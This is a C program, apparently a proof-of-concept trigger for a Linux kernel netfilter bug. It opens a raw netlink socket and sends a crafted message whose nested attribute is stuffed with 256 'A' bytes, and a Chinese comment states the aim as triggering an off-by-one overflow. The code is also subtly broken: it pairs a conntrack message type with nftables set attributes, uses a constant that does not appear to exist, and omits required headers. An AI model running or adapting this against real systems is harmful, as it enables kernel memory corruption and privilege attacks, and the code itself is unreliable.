#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

int main() {
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
    bind(fd, (struct sockaddr*)&addr, sizeof(addr));

    struct nlmsghdr *nlh = malloc(4096);
    memset(nlh, 0, 4096);
    nlh->nlmsg_len = NLMSG_HDRLEN + sizeof(struct nfgenmsg) + NLA_HDRLEN + 256;
    nlh->nlmsg_type = NFNL_SUBSYS_CTNETLINK << 8 | IPCTNL_MSG_CT_NEW;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    nlh->nlmsg_seq = 1;
    nlh->nlmsg_pid = getpid();

    struct nfgenmsg *nfg = NLMSG_DATA(nlh);
    nfg->nfgen_family = AF_INET;
    nfg->version = NFNETLINK_V0;
    nfg->res_id = 0;

    struct nlattr *nested = NLMSG_TAIL(nlh);
    nested->nla_type = NFTA_SET_ELEM_LIST | NLA_F_NESTED;
    nested->nla_len = NLA_HDRLEN + NLA_HDRLEN + 256;

    struct nlattr *key = (struct nlattr*)((char*)nested + NLA_HDRLEN);
    key->nla_type = NFTA_SET_ELEM_KEY_UNSPEC;
    key->nla_len = NLA_HDRLEN + 256;
    memset((char*)key + NLA_HDRLEN, 'A', 256); // 填充256字节，触发off-by-one

    send(fd, nlh, nlh->nlmsg_len, 0);
    close(fd);
    return 0;
}


